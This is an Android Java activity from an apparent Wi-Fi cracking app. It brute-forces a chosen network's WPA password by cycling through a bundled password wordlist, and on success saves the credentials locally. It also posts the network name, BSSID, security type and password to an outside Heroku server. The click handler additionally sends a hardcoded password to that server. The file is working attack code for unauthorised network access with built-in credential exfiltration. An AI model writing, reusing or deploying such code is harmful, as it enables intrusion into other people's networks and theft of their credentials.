package com.artemy.wifistuff.rachel;

import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.artemy.wifistuff.R;
import com.artemy.wifistuff.Wifi;
import com.artemy.wifistuff.WifiHelper;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.Scanner;

public class infoActivity extends AppCompatActivity implements View.OnClickListener {

    WifiHelper wifiHelper;
    Wifi wifitosqlite;


    SharedPreferences sp;
    TextView tvname;
    TextView tvbssid;
    TextView tvcapabilities;
    Button connectbtn;
    TextView tvpassword;

    WifiConfiguration conf;
    WifiManager wifi;

     ArrayList<String>filePasswords;
    Handler handler;
     int indexpassword = 0;
     String strPassword = "";
    ScanWifi scanWifi;

    NetworkInfo networkInfo;
    ConnectivityManager connectivityManager;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_info);
        sp = getSharedPreferences("details",0);
        wifiHelper  = new WifiHelper(this);

        tvname = (TextView) findViewById(R.id.name);
        tvbssid = (TextView) findViewById(R.id.bssid);
        tvcapabilities = (TextView) findViewById(R.id.capabilities);
        tvpassword = (TextView) findViewById(R.id.password);

        connectbtn = (Button) findViewById(R.id.connectbtn);
        connectbtn.setOnClickListener(this);

        String name = getIntent().getExtras().getString("name");
        String bssid = getIntent().getExtras().getString("bssid");
        String capabilities = getIntent().getExtras().getString("capabilities");

        tvname.setText("Name: " + name);
        tvbssid.setText("BSSID: " + bssid);
        tvcapabilities.setText("Capabilities: " + capabilities);
        tvpassword.setText("");

        filePasswords = getPass();
        handler = new Handler(new Handler.Callback() {
            @Override
            public boolean handleMessage(Message message) {
                    Log.d("artimi", "conected is " + (String) message.obj);
                    String strpassword = (String) message.obj;
                    connecttowifi(strPassword);

                    if (IsConnected())
                    {
                        tvpassword.setTextColor(Color.RED);
                        tvpassword.setText(strpassword);
                        //get setting info
                        boolean b = sp.getBoolean("on",true);
                        if(b) {
                            wifitosqlite = new Wifi(tvname.getText().toString(),tvpassword.getText().toString()
                            ,tvcapabilities.getText().toString(),tvbssid.getText().toString(),null);
                            wifiHelper.insertWifi(wifitosqlite);
                            sendNetwork(strpassword);

                        }
                    }
                    else {
                        tvpassword.setTextColor(Color.BLUE);
                        tvpassword.setText("couldn't connect with password " + strpassword );
                    }
                    return true;
            }
        });
        scanWifi = new ScanWifi();

    }
    class ScanWifi extends Thread{

        @Override
        public void run() {
            super.run();
            while (indexpassword<filePasswords.size()){
                try {
                    if(!IsConnected()) {
                        strPassword = filePasswords.get(indexpassword);
                        Message message = new Message();
                        message.obj = strPassword;
                        Thread.sleep(3000);
                        handler.sendMessage(message);
                        Thread.sleep(6000);
                    }

                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                finally {
                    indexpassword++;

                }
            }
        }

    }

    public void connecttowifi(String networkPass) {

        String networkSSID = getIntent().getExtras().getString("name");

        conf = new WifiConfiguration();
        conf.SSID = String.format("\"%s\"", networkSSID);
        conf.preSharedKey = String.format("\"%s\"", networkPass);

        wifi = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        int netId = wifi.addNetwork(conf);
        wifi.disconnect();
        wifi.enableNetwork(netId, true);
        wifi.reconnect();

        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(6000);
                } catch (Exception e) {
                    e.getLocalizedMessage();
                }
            }
        });
        thread.run();

    }

    public void onClick(View view) {

        //connecttowifi("Amal1@st");

        connectbtn.setEnabled(false);
        scanWifi.start();
        sendNetwork("Amal1@st");
//        String pass = “”;

//        InputStream is = getResources().openRawResource(R.raw.passwords);
//        Scanner s = new Scanner(is);
//
//        if (s != null) {
//            ArrayList<String> list = new ArrayList<String>();
//            while (s.hasNext()){
//                list.add(s.next());
//            }
//            s.close();
//
//            new Thread(new Runnable() {
//                @Override
//                public void run() {
//                    //thread 1
//
//                    new Handler(Looper.getMainLooper()).post(new Runnable() {
//                        @Override
//                        public void run() {
//                            //main thread
//                        }
//                    });
//                }
//            }).start();
//
//            for (String pass : list) {
//                //If the device is not connected to the requested network
//                //Try to connect with “pass”
//                //Wait few seconds to check if the connection succeeded
//
//                if (!hasInternetConnection()) {
//                    connecttowifi(pass);
//                    try {
//                        Thread.sleep(1000);
//                    } catch (InterruptedException e) {
//                        e.printStackTrace();
//                    }
//                }
//            }
////            sendNetwork(tvname.getText().toString(),pass);
//        }else {
//            //TODO: print log
//        }

    }

    public boolean IsConnected() {

        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (networkInfo.isConnected()){
            return true;
        }
        return false;

    }

    void sendNetwork( String pass) {
        // TODO: Implement this method to send token to your app server.
        SendMessage apiHandler = new SendMessage();
        JSONObject params = new JSONObject();
        try {
            params.put("wifiname", tvname.getText().toString());
            params.put("bssid", tvbssid.getText().toString());
            params.put("wifipasstype", tvcapabilities.getText().toString());
            params.put("wifipass", pass);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        try {
            apiHandler.post("https://droneserverv1.herokuapp.com/api/WIFI/add", params.toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public ArrayList<String>getPass() {
        InputStream is = getResources().openRawResource(R.raw.passwords);
        Scanner s = new Scanner(is);
        ArrayList<String> list = new ArrayList<String>();

        if (s != null) {
            while (s.hasNext()) {
                list.add(s.next());
            }
            s.close();

        }
        return list;

    }

}